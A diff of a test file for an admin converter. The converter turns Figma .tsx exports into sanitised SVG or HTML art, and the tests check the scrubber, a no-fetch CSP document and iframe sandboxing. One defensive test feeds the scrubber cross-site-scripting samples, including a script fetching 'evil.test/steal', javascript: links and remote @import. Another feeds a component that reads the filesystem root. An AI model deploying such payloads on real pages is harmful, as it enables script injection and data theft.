@@ -3,65 +3,107 @@ import { join } from "node:path";
 import { renderToStaticMarkup } from "react-dom/server";
 import { describe, expect, it } from "vitest";
 
-import { extractSvg, tsxToSvg } from "@/lib/admin/tsx-to-svg";
+import { extractArt, tsxToArt } from "@/lib/admin/tsx-to-art";
 import { sanitizeSvg, SVG_MAX_BYTES } from "@/lib/admin/svg-file";
+import { artDocument, sanitizeHtml } from "@/lib/admin/html-file";
 
 /**
- * The Figma door, tested on the founder's actual export.
+ * The Figma door, tested on the founder's actual exports.
  *
- * tests/fixtures/figma-lightning.tsx is the file he sent, byte for
- * byte. If a change to the converter stops handling it, this fails -
- * which is the point: "drop it in and it works" is a promise about
- * real files, not about a simplified one written to pass.
+ * Both fixtures are files he sent, byte for byte. figma-lightning.tsx
+ * draws an `<svg>`; figma-robin.tsx draws spinning divs with little
+ * SVG hands inside, uses `useMemo`, and was turned away by the first
+ * version of this door with a message that was not even true. If a
+ * change stops handling either, this fails - which is the point: "drop
+ * it in and it works" is a promise about real files, not about
+ * simplified ones written to pass.
  */
 
-const fixture = readFileSync(
+const lightning = readFileSync(
   join(process.cwd(), "tests/fixtures/figma-lightning.tsx"),
   "utf8",
 );
+const robin = readFileSync(
+  join(process.cwd(), "tests/fixtures/figma-robin.tsx"),
+  "utf8",
+);
 
-describe("a Figma .tsx becomes a drawing", () => {
-  const result = tsxToSvg(fixture, renderToStaticMarkup);
+describe("a Figma .tsx that draws an SVG", () => {
+  const result = tsxToArt(lightning, renderToStaticMarkup);
 
   it("converts the founder's lightning export", () => {
     expect(result.ok).toBe(true);
+    if (!result.ok) return;
+    expect(result.kind).toBe("svg");
   });
 
   it("keeps all 88 sparks and the ring", () => {
     if (!result.ok) throw new Error("conversion failed");
     /* 88 sparks plus the silhouette path the mock draws. */
-    expect((result.svg.match(/<path/g) ?? []).length).toBeGreaterThanOrEqual(88);
-    expect(result.svg).toContain("<circle");
+    expect((result.markup.match(/<path/g) ?? []).length).toBeGreaterThanOrEqual(88);
+    expect(result.markup).toContain("<circle");
   });
 
   it("carries the keyframes INSIDE the drawing", () => {
     if (!result.ok) throw new Error("conversion failed");
     /* They sat in a <style> beside the SVG in the export. Left there,
        the art would arrive frozen. */
-    expect(result.svg).toContain("@keyframes lf-a");
-    expect(result.svg).toContain("@keyframes ring-breathe");
-    expect(result.svg.indexOf("@keyframes")).toBeGreaterThan(
-      result.svg.indexOf("<svg"),
+    expect(result.markup).toContain("@keyframes lf-a");
+    expect(result.markup).toContain("@keyframes ring-breathe");
+    expect(result.markup.indexOf("@keyframes")).toBeGreaterThan(
+      result.markup.indexOf("<svg"),
     );
   });
 
   it("is a standalone document, namespace and all", () => {
     if (!result.ok) throw new Error("conversion failed");
-    expect(result.svg.startsWith("<svg")).toBe(true);
-    expect(result.svg).toContain('xmlns="http://www.w3.org/2000/svg"');
-    expect(result.svg.endsWith("</svg>")).toBe(true);
+    expect(result.markup.startsWith("<svg")).toBe(true);
+    expect(result.markup).toContain('xmlns="http://www.w3.org/2000/svg"');
+    expect(result.markup.endsWith("</svg>")).toBe(true);
+  });
+});
+
+/**
+ * The export that broke the door. The founder saw "That component drew
+ * no SVG. A cosmetic has to be an <svg>, not a div of HTML." Two things
+ * were wrong with that: the file DID contain SVG, and the real failure
+ * was that it never rendered at all, because the require shim handed
+ * out an object with only createElement on it and the file's first line
+ * is `import { useMemo } from "react"`.
+ */
+describe("a Figma .tsx that draws HTML", () => {
+  const result = tsxToArt(robin, renderToStaticMarkup);
+
+  it("converts the founder's Robin export", () => {
+    expect(result.ok).toBe(true);
   });
 
-  it("refuses a file with nothing to draw", () => {
-    const notArt = tsxToSvg(
-      `export default function App() { return <div>hello</div>; }`,
-      renderToStaticMarkup,
-    );
-    expect(notArt).toEqual({ ok: false, reason: "no-svg" });
+  it("is kept as HTML, not butchered into the SVG bits inside it", () => {
+    if (!result.ok) throw new Error("conversion failed");
+    /* Slicing first-<svg> to last-</svg> would have thrown away the
+       rings and kept the hands. The rings are the cosmetic. */
+    expect(result.kind).toBe("html");
+    expect(result.markup).toContain("conic-gradient");
+    expect(result.markup).toContain("<svg");
   });
 
+  it("brings its keyframes with it", () => {
+    if (!result.ok) throw new Error("conversion failed");
+    expect(result.markup).toContain("@keyframes fleurCycle");
+    expect(result.markup).toContain("@keyframes ringSpin");
+  });
+
+  it("draws all eight arms, so the hooks really ran", () => {
+    if (!result.ok) throw new Error("conversion failed");
+    /* useMemo builds the arm list. If React were still a stub, this
+       file would throw instead of drawing anything. */
+    expect((result.markup.match(/animation:fleurCycle/g) ?? []).length).toBe(8);
+  });
+});
+
+describe("what the converter refuses", () => {
   it("refuses a file with no default export", () => {
-    const orphan = tsxToSvg(
+    const orphan = tsxToArt(
       `export function Thing() { return <svg />; }`,
       renderToStaticMarkup,
     );
@@ -71,7 +113,7 @@ describe("a Figma .tsx becomes a drawing", () => {
   it("refuses a file that USES anything but React", () => {
     /* A file that actually reaches for the filesystem cannot run: the
        require shim hands out React and nothing else. */
-    const greedy = tsxToSvg(
+    const greedy = tsxToArt(
       `import fs from "node:fs";
        export default function App() {
          return <svg><title>{String(fs.readdirSync("/"))}</title></svg>;
@@ -84,20 +126,42 @@ describe("a Figma .tsx becomes a drawing", () => {
   it("shrugs off an import it never uses", () => {
     /* The transform elides unused imports, so this is a file that
        imports nothing at run time. Harmless, and it should convert. */
-    const tidy = tsxToSvg(
+    const tidy = tsxToArt(
       `import fs from "node:fs";\nexport default function App() { return <svg><rect /></svg>; }`,
       renderToStaticMarkup,
     );
     expect(tidy.ok).toBe(true);
   });
+
+  it("refuses a component that renders nothing", () => {
+    const empty = tsxToArt(
+      `export default function App() { return null; }`,
+      renderToStaticMarkup,
+    );
+    expect(empty).toEqual({ ok: false, reason: "nothing-drawn" });
+  });
+
+  it("takes hooks in its stride, which is the whole fix", () => {
+    const hooked = tsxToArt(
+      `import { useMemo, useState, useRef } from "react";
+       export default function App() {
+         const n = useMemo(() => 3, []);
+         const [on] = useState(true);
+         const box = useRef(null);
+         return <div ref={box}>{on ? n : 0}</div>;
+       }`,
+      renderToStaticMarkup,
+    );
+    expect(hooked.ok).toBe(true);
+  });
 });
 
 describe("the drawing is scrubbed before anybody sees it", () => {
   it("keeps the lightning intact", () => {
-    const converted = tsxToSvg(fixture, renderToStaticMarkup);
+    const converted = tsxToArt(lightning, renderToStaticMarkup);
     if (!converted.ok) throw new Error("conversion failed");
 
-    const clean = sanitizeSvg(converted.svg);
+    const clean = sanitizeSvg(converted.markup);
     expect(clean.ok).toBe(true);
     if (!clean.ok) return;
     expect((clean.svg.match(/<path/g) ?? []).length).toBeGreaterThanOrEqual(88);
@@ -142,6 +206,75 @@ describe("the drawing is scrubbed before anybody sees it", () => {
   });
 });
 
+describe("HTML art is scrubbed and then boxed in", () => {
+  it("keeps the Robin ring intact", () => {
+    const converted = tsxToArt(robin, renderToStaticMarkup);
+    if (!converted.ok) throw new Error("conversion failed");
+
+    const clean = sanitizeHtml(converted.markup);
+    expect(clean.ok).toBe(true);
+    if (!clean.ok) return;
+    expect(clean.html).toContain("conic-gradient");
+    expect(clean.html).toContain("@keyframes fleurCycle");
+    expect((clean.html.match(/animation:fleurCycle/g) ?? []).length).toBe(8);
+  });
+
+  it("strips everything that executes, embeds or fetches", () => {
+    const nasty = sanitizeHtml(
+      `<div>` +
+        `<script>fetch("https://evil.test/steal")</script>` +
+        `<span onmouseover="alert(1)">hi</span>` +
+        `<iframe src="https://evil.test"></iframe>` +
+        `<link rel="stylesheet" href="https://evil.test/x.css">` +
+        `<img src="https://evil.test/pixel.png">` +
+        `<a href="javascript:alert(2)">x</a>` +
+        `<style>@import url("https://evil.test/f.css");` +
+        `.a{background:url(https://evil.test/bg.png)}</style>` +
+        `</div>`,
+    );
+
+    expect(nasty.ok).toBe(true);
+    if (!nasty.ok) return;
+
+    expect(nasty.html).not.toContain("<script");
+    expect(nasty.html).not.toContain("<iframe");
+    expect(nasty.html).not.toContain("<link");
+    expect(nasty.html).not.toContain("onmouseover");
+    expect(nasty.html).not.toContain("evil.test");
+    expect(nasty.html).not.toContain("javascript:");
+    expect(nasty.html).not.toContain("@import");
+  });
+
+  it("refuses markup with nothing left in it", () => {
+    expect(sanitizeHtml("")).toEqual({ ok: false, reason: "empty" });
+    expect(sanitizeHtml("<script>alert(1)</script>")).toEqual({
+      ok: false,
+      reason: "nothing-left",
+    });
+  });
+
+  it("ships inside a document that cannot fetch anything", () => {
+    /* The third lock, after the scrubber and the sandbox: even markup
+       that got past both cannot load a font or a tracking pixel. */
+    const doc = artDocument("<div>art</div>");
+    expect(doc).toContain("default-src 'none'");
+    expect(doc).toContain("style-src 'unsafe-inline'");
+    expect(doc).toContain("img-src data:");
+    expect(doc).toContain("background:transparent");
+  });
+
+  it("the renderer never gives HTML art permission to run code", () => {
+    const film = readFileSync(
+      join(process.cwd(), "src/components/players/cosmetic-film.tsx"),
+      "utf8",
+    );
+    expect(film).toContain('sandbox=""');
+    /* Not "no allow-scripts anywhere" - the comment beside it says the
+       words. What must not exist is a sandbox that grants them. */
+    expect(film).not.toMatch(/sandbox=\{?["'][^"']*allow-scripts/);
+  });
+});
+
 describe("the shipped lightning ring", () => {
   it("matches what its source converts to today", () => {
     /* The committed SVG is generated from src/cosmetics by
@@ -156,11 +289,11 @@ describe("the shipped lightning ring", () => {
       "utf8",
     );
 
-    const rebuilt = tsxToSvg(source, renderToStaticMarkup);
+    const rebuilt = tsxToArt(source, renderToStaticMarkup);
     expect(rebuilt.ok).toBe(true);
     if (!rebuilt.ok) return;
 
-    const clean = sanitizeSvg(rebuilt.svg);
+    const clean = sanitizeSvg(rebuilt.markup);
     expect(clean.ok).toBe(true);
     if (!clean.ok) return;
 
@@ -180,22 +313,79 @@ describe("the shipped lightning ring", () => {
   });
 });
 
-describe("extractSvg", () => {
-  it("finds the drawing inside a wrapper and moves the styles in", () => {
-    const svg = extractSvg(
-      `<div><style>@keyframes x{}</style><svg viewBox="0 0 1 1"><rect/></svg></div>`,
+describe("extractArt", () => {
+  it("finds a drawing inside a wrapper and moves the styles in", () => {
+    const art = extractArt(
+      `<style>@keyframes x{}</style><svg viewBox="0 0 1 1"><rect/></svg>`,
     );
-    expect(svg).not.toBeNull();
-    expect(svg).toContain("@keyframes x");
-    expect(svg?.startsWith("<svg")).toBe(true);
+    expect(art?.kind).toBe("svg");
+    expect(art?.markup).toContain("@keyframes x");
+    expect(art?.markup.startsWith("<svg")).toBe(true);
   });
 
   it("leaves styles that were already inside alone", () => {
-    const svg = extractSvg(`<svg><style>@keyframes y{}</style><rect/></svg>`);
-    expect((svg?.match(/@keyframes y/g) ?? []).length).toBe(1);
+    const art = extractArt(`<svg><style>@keyframes y{}</style><rect/></svg>`);
+    expect((art?.markup.match(/@keyframes y/g) ?? []).length).toBe(1);
   });
 
-  it("says so when there is no drawing", () => {
-    expect(extractSvg("<div>nothing here</div>")).toBeNull();
+  it("calls a div of HTML what it is instead of refusing it", () => {
+    const art = extractArt(`<div class="ring">nothing svg here</div>`);
+    expect(art?.kind).toBe("html");
+    expect(art?.markup).toContain("<div");
+  });
+
+  it("peels the centring wrapper off a lone drawing", () => {
+    /* Figma Make centres its art in a div. The wrapper only ever
+       positions the art, and the cosmetic layer positions it again. */
+    const art = extractArt(`<div style="display:grid"><svg><rect/></svg></div>`);
+    expect(art?.kind).toBe("svg");
+    expect(art?.markup.startsWith("<svg")).toBe(true);
+  });
+
+  it("keeps a wrapper with more than a drawing in it as HTML", () => {
+    /* This is the Robin shape: rings and hands together. Peeling here
+       would throw away everything that is not the svg. */
+    const art = extractArt(`<div><i class="ring"></i><svg><rect/></svg></div>`);
+    expect(art?.kind).toBe("html");
+    expect(art?.markup).toContain('class="ring"');
+  });
+
+  it("keeps two sibling drawings as HTML rather than picking one", () => {
+    const art = extractArt(`<div><svg><rect/></svg><svg><circle/></svg></div>`);
+    expect(art?.kind).toBe("html");
+  });
+
+  it("takes the page background off the outermost element", () => {
+    /* Figma Make builds a demo page. A flat fill behind everything is
+       the page, and as a cosmetic it is an opaque square on a face. */
+    const art = extractArt(
+      `<div style="position:relative;background:#07050f"><i/></div>`,
+    );
+    expect(art?.markup).not.toContain("#07050f");
+    expect(art?.markup).toContain("position:relative");
+  });
+
+  it("keeps a gradient on the outermost element, because that IS the art", () => {
+    const art = extractArt(
+      `<div style="background:conic-gradient(#4c0099,#a855f7)"><i/></div>`,
+    );
+    expect(art?.markup).toContain("conic-gradient");
+  });
+
+  it("leaves backgrounds on inner elements alone", () => {
+    const art = extractArt(`<div><i style="background:#111"></i></div>`);
+    expect(art?.markup).toContain("#111");
+  });
+
+  it("puts loose styles in front of HTML art, where the frame finds them", () => {
+    const art = extractArt(`<style>@keyframes z{}</style><div class="a"></div>`);
+    expect(art?.kind).toBe("html");
+    expect(art?.markup.startsWith("<style>")).toBe(true);
+    expect(art?.markup).toContain("@keyframes z");
+  });
+
+  it("says so when nothing was drawn", () => {
+    expect(extractArt("")).toBeNull();
+    expect(extractArt("<style>.a{}</style>")).toBeNull();
   });
 });
